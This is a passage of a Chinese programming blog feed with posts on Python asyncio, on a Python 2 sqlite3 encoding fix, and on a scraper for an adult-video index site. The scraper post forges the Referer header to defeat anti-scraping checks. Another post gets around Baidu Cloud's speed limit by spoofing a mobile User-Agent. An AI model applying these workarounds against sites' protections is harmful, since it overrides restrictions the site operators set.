<h3 id="然后是-IO-复用"><a href="#然后是-IO-复用" class="headerlink" title="然后是 IO 复用"></a>然后是 IO 复用</h3><p>即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。</p>
<h3 id="再之后是信号驱动"><a href="#再之后是信号驱动" class="headerlink" title="再之后是信号驱动"></a>再之后是信号驱动</h3><p>即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。</p>
<h3 id="最后是异步-IO"><a href="#最后是异步-IO" class="headerlink" title="最后是异步 IO"></a>最后是异步 IO</h3><p>即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。<br>虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。</p>
<h2 id="然后我们了解一下事件循环-Event-Loop"><a href="#然后我们了解一下事件循环-Event-Loop" class="headerlink" title="然后我们了解一下事件循环(Event Loop)"></a>然后我们了解一下事件循环(Event Loop)</h2><p>Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。</p>
<p><img src="http://image.beekka.com/blog/201310/2013102001.png" alt="Event Loop"></p>
<p>我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</p>
<p>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。</p>
<p>那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。</p>
<p>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p>
<pre><code>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。
（2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。
（3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。
（4）主线程不断重复上面的第三步。
</code></pre><p>下图就是主线程和任务队列的示意图。</p>
<p><img src="http://image.beekka.com/blog/2014/bg2014100801.jpg" alt=""></p>
<p>只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。</p>
<p>所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。</p>
<h1 id="为什么要使用异步编程？"><a href="#为什么要使用异步编程？" class="headerlink" title="为什么要使用异步编程？"></a>为什么要使用异步编程？</h1><p>CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。</p>
<p>在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。</p>
<p>因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。</p>
<p>多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。</p>
<p>由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。</p>
<p>另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。</p>
<h1 id="如何利用Python实现异步"><a href="#如何利用Python实现异步" class="headerlink" title="如何利用Python实现异步"></a>如何利用Python实现异步</h1><p>我们首先需要了解以下几个概念：</p>
<ul>
<li>Event Loop</li>
<li>Coroutine</li>
</ul>
<p>其中Event Loop在前面已经解释过<br>Coroutine是协程，具体解释可以查阅<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000" target="_blank" rel="external">协程</a></p>
<p>Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性：</p>
<ul>
<li>通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的；</li>
<li>协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。</li>
</ul>
<p>这里我就从廖大哪里搬运个小例子(有改动)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'Hello world! (%s)'</span> % threading.currentThread())</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line">    print(<span class="string">'Hello again! (%s)'</span> % threading.currentThread())</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">tasks = [hello(), hello()]</div><div class="line">loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p>
<p>执行结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">(暂停约<span class="number">1</span>秒)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div></pre></td></tr></table></figure>
<p>其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行<br>hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。</p>
<p>下一篇文章将在此基础上实现一个简洁、普适的爬虫框架</p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;本文主要从一下几个方面进行说明:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是&lt;a href=&quot;http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B&quot;&gt;异步(Asynchronous)编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;为什么要使用异步编程？&lt;/li&gt;
&lt;li&gt;如何利用Python实现异步&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>javbus爬虫-老司机你值得拥有</title>
    <link href="http://hacktech.cn/2016/12/06/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89/"/>
    <id>http://hacktech.cn/2016/12/06/javbus爬虫-老司机你值得拥有/</id>
    <published>2016-12-06T10:21:53.000Z</published>
    <updated>2016-12-06T12:00:42.000Z</updated>
    
    <content type="html"><![CDATA[<hr>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="external">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
<hr>
<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
<ul>
<li>爬虫调度启动程序crawler.py</li>
<li>页面下载程序downloader.py</li>
<li>页面解析程序pageparser.py</li>
<li>数据库入库与去重管理程序controler.py</li>
</ul>
<a id="more"></a>
<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
<hr>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
<p>在写爬虫的过程中遇到了一些问题</p>
<ol>
<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
</li>
<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
</li>
<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
</li>
<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</div></pre></td></tr></table></figure>
<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
</li>
<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="external">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
</li>
<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
</li>
</ol>
<hr>
<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
<ol>
<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
</li>
<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
</li>
<li><p>多看别人的博客学习思路</p>
</li>
</ol>
<hr>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
<hr>
<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
<hr>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
<ul>
<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
</ul>
<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
<p><strong>转载请注明来源作者</strong></p>
<ul>
<li>博客：53xiaoshuo.com | hacktech.cn</li>
<li>作者：Akkuman</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的&lt;a href=&quot;https://www.javbus5.com/SRS-055这种链接，&quot;&gt;https://www.javbus5.com/SRS-055这种链接，&lt;/a&gt;&lt;br&gt;我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;构思&quot;&gt;&lt;a href=&quot;#构思&quot; class=&quot;headerlink&quot; title=&quot;构思&quot;&gt;&lt;/a&gt;构思&lt;/h1&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;爬虫调度启动程序crawler.py&lt;/li&gt;
&lt;li&gt;页面下载程序downloader.py&lt;/li&gt;
&lt;li&gt;页面解析程序pageparser.py&lt;/li&gt;
&lt;li&gt;数据库入库与去重管理程序controler.py&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>突破百度云限速与网页限制批量下载</title>
    <link href="http://hacktech.cn/2016/12/06/%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/"/>
    <id>http://hacktech.cn/2016/12/06/突破百度云限速与网页限制批量下载/</id>
    <published>2016-12-06T06:33:26.000Z</published>
    <updated>2016-12-06T06:34:24.591Z</updated>
    
    <content type="html"><![CDATA[<p><strong>百度云限速比较坑，现在基本200k左右</strong><br><strong>很多人都知道了，但是总有朋友问我，我说明一下</strong></p>
<h1 id="首先下载IDM-最好支持正版"><a href="#首先下载IDM-最好支持正版" class="headerlink" title="首先下载IDM(最好支持正版)"></a>首先下载IDM(最好支持正版)</h1><p>下载链接：<br><a href="https://eyun.baidu.com/s/3nvg3jdf" target="_blank" rel="external">百度云shaoit</a></p>
<h1 id="开始下载："><a href="#开始下载：" class="headerlink" title="开始下载："></a>开始下载：</h1><p>一般的话，小文件直接打开浏览器就可以下载</p>
<h1 id="大文件下载："><a href="#大文件下载：" class="headerlink" title="大文件下载："></a>大文件下载：</h1><p>首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载</p>
<h1 id="批量下载与外链获取"><a href="#批量下载与外链获取" class="headerlink" title="批量下载与外链获取"></a>批量下载与外链获取</h1><p>使用这个脚本，具体看链接内介绍</p>
<a id="more"></a>
<p><a href="https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B" target="_blank" rel="external">https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h2 id="如何安装用户脚本"><a href="#如何安装用户脚本" class="headerlink" title="如何安装用户脚本"></a>如何安装用户脚本</h2><ul>
<li>Firefox 及相关的浏览器：Greasemonkey。</li>
<li>Google Chrome、Chromium 及相关的浏览器：Tampermonkey。</li>
<li>Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。</li>
<li>Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;百度云限速比较坑，现在基本200k左右&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;很多人都知道了，但是总有朋友问我，我说明一下&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;首先下载IDM-最好支持正版&quot;&gt;&lt;a href=&quot;#首先下载IDM-最好支持正版&quot; class=&quot;headerlink&quot; title=&quot;首先下载IDM(最好支持正版)&quot;&gt;&lt;/a&gt;首先下载IDM(最好支持正版)&lt;/h1&gt;&lt;p&gt;下载链接：&lt;br&gt;&lt;a href=&quot;https://eyun.baidu.com/s/3nvg3jdf&quot;&gt;百度云shaoit&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;开始下载：&quot;&gt;&lt;a href=&quot;#开始下载：&quot; class=&quot;headerlink&quot; title=&quot;开始下载：&quot;&gt;&lt;/a&gt;开始下载：&lt;/h1&gt;&lt;p&gt;一般的话，小文件直接打开浏览器就可以下载&lt;/p&gt;
&lt;h1 id=&quot;大文件下载：&quot;&gt;&lt;a href=&quot;#大文件下载：&quot; class=&quot;headerlink&quot; title=&quot;大文件下载：&quot;&gt;&lt;/a&gt;大文件下载：&lt;/h1&gt;&lt;p&gt;首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载&lt;/p&gt;
&lt;h1 id=&quot;批量下载与外链获取&quot;&gt;&lt;a href=&quot;#批量下载与外链获取&quot; class=&quot;headerlink&quot; title=&quot;批量下载与外链获取&quot;&gt;&lt;/a&gt;批量下载与外链获取&lt;/h1&gt;&lt;p&gt;使用这个脚本，具体看链接内介绍&lt;/p&gt;
    
    </summary>
    
      <category term="life" scheme="http://hacktech.cn/categories/life/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>ProgrammingError: You must not use 8-bit bytestrings...</title>
    <link href="http://hacktech.cn/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings/"/>
    <id>http://hacktech.cn/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings/</id>
    <published>2016-12-06T06:31:14.000Z</published>
    <updated>2016-12-06T06:32:55.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题出现："><a href="#问题出现：" class="headerlink" title="问题出现："></a>问题出现：</h1><p>You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.</p>
<h1 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h1><p>问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。</p>
<h1 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h1><h2 id="1-按提示"><a href="#1-按提示" class="headerlink" title="1. 按提示"></a>1. 按提示</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">connection = sqlite3.connect(...)</div><div class="line">connection.text_factory = str</div></pre></td></tr></table></figure>
<p>但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2</p>
<h2 id="2-以utf8的编码格式进行解码转为unicode编码做插入"><a href="#2-以utf8的编码格式进行解码转为unicode编码做插入" class="headerlink" title="2. 以utf8的编码格式进行解码转为unicode编码做插入"></a>2. 以utf8的编码格式进行解码转为unicode编码做插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', (<span class="string">'张三'</span>.decode(<span class="string">'utf-8'</span>), <span class="string">'22岁'</span>.decode(<span class="string">'utf-8'</span>)))</div></pre></td></tr></table></figure>
<p>但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf-8-*-</span></div><div class="line"><span class="keyword">import</span> sqlite3</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_utf8</span><span class="params">(aStr)</span>:</span></div><div class="line">    <span class="keyword">return</span> aStr.decode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">conn = sqlite3.connect(<span class="string">"something.db"</span>)</div><div class="line">cursor = conn.cursor()</div><div class="line"></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    CREATE TABLE IF NOT EXISTS JAVBUS_DATA(</div><div class="line">        id       INT PRIMARY KEY,</div><div class="line">        姓名     TEXT,</div><div class="line">        年龄     TEXT);''')</div><div class="line"><span class="keyword">print</span> <span class="string">"Table created successfully"</span></div><div class="line">cursor.execute(<span class="string">'''</span></div><div class="line">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</div><div class="line">    VALUES (?, ?)</div><div class="line">    ''', map(decode_utf8, (<span class="string">'张三'</span>, <span class="string">'22岁'</span>)))</div><div class="line"></div><div class="line">cursor.close()</div><div class="line">conn.commit()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h1 id="其他注意："><a href="#其他注意：" class="headerlink" title="其他注意："></a>其他注意：</h1><p>有时用第二种方法会出现UnicodeDecodeError<br>加入#-<em>-coding:utf-8-</em>-<br>还是不行请sys指定编码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys  </div><div class="line">reload(sys)  </div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div></pre></td></tr></table></figure></p>
<p><strong>这个问题在python3应该不会出现，python2编码问题，仅作记录</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题出现：&quot;&gt;&lt;a href=&quot;#问题出现：&quot; class=&quot;headerlink&quot; title=&quot;问题出现：&quot;&gt;&lt;/a&gt;问题出现：&lt;/h1&gt;&lt;p&gt;You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.&lt;/p&gt;
&lt;h1 id=&quot;产生原因：&quot;&gt;&lt;a href=&quot;#产生原因：&quot; class=&quot;headerlink&quot; title=&quot;产生原因：&quot;&gt;&lt;/a&gt;产生原因：&lt;/h1&gt;&lt;p&gt;问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。&lt;/p&gt;
&lt;h1 id=&quot;解决方法：&quot;&gt;&lt;a href=&quot;#解决方法：&quot; class=&quot;headerlink&quot; title=&quot;解决方法：&quot;&gt;&lt;/a&gt;解决方法：&lt;/h1&gt;&lt;h2 id=&quot;1-按提示&quot;&gt;&lt;a href=&quot;#1-按提示&quot; class=&quot;headerlink&quot; title=&quot;1. 按提示&quot;&gt;&lt;/a&gt;1. 按提示&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;connection = sqlite3.connect(...)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;connection.text_factory = str&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2&lt;/p&gt;
&lt;h2 id=&quot;2-以utf8的编码格式进行解码转为unicode编码做插入&quot;&gt;&lt;a href=&quot;#2-以utf8的编码格式进行解码转为unicode编码做插入&quot; class=&quot;headerlink&quot; title=&quot;2. 以utf8的编码格式进行解码转为unicode编码做插入&quot;&gt;&lt;/a&gt;2. 以utf8的编码格式进行解码转为unicode编码做插入&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cursor.execute(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&#39;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    INSERT INTO JAVBUS_DATA 